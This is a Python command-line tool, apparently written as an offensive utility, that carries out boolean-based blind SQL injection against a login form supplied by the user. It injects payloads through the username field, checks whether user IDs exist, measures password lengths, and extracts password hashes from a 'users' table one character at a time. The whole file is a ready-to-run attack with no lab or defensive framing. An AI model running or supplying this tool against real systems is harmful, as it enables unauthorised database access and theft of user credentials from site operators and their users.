import requests
import argparse

# Setup argument parser for command-line options
parser = argparse.ArgumentParser(description='SQL Injection Exploitation Tool')
parser.add_argument('--target', required=True, help='Target URL of the vulnerable login form')
parser.add_argument('--needle', required=True, help='Text that indicates a successful SQL query')
args = parser.parse_args()

# Global variables
total_queries = 0
charset = "0123456789abcdef"  # Add or remove characters based on the expected hash format

# Perform an SQL injection query and check if the needle is in the response
def injected_query(payload):
    global total_queries
    total_queries += 1
    response = requests.post(args.target, data={"username": f"admin' AND {payload}--", "password": "not_important"})
    return args.needle not in response.text

# Execute a boolean-based SQL injection to determine if a condition is true
def boolean_query(offset, user_id, char, operator=">"):
    payload = f"(SELECT hex(substr(password,{offset + 1},1)) FROM users WHERE id = {user_id}) {operator} hex('{char}')"
    return injected_query(payload)

# Check if a user ID exists in the database
def invalid_user(user_id):
    payload = f"(SELECT id FROM users WHERE id = {user_id}) IS NULL"
    return injected_query(payload)

# Determine the length of the password for a user
def password_length(user_id):
    i = 0
    while True:
        payload = f"(SELECT length(password) FROM users WHERE id = {user_id}) > {i}"
        if injected_query(payload):
            return i
        i += 1

# Extract the password hash character by character
def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(password_length):
        for char in charset:
            if boolean_query(i, user_id, char, '='):
                found += char
                break
    return found

# Report the total number of SQL queries performed
def total_queries_taken():
    global total_queries
    print(f"\t[!] {total_queries} total queries executed!")
    total_queries = 0

# Main execution logic
if __name__ == '__main__':
    while True:
        try:
            user_id = input("Enter a user ID to extract the password hash: ")
            if not invalid_user(user_id):
                user_password_length = password_length(user_id)
                print(f"\t[-] User {user_id} has password length: {user_password_length}")
                total_queries_taken()
                user_hash = extract_hash(charset, int(user_id), user_password_length)
                print(f"\t[-] User {user_id} hash: {user_hash}")
                total_queries_taken()
            else:
                print(f"\t[X] User {user_id} does not exist!")
        except KeyboardInterrupt:
            print("\nExecution terminated by user.")
            break
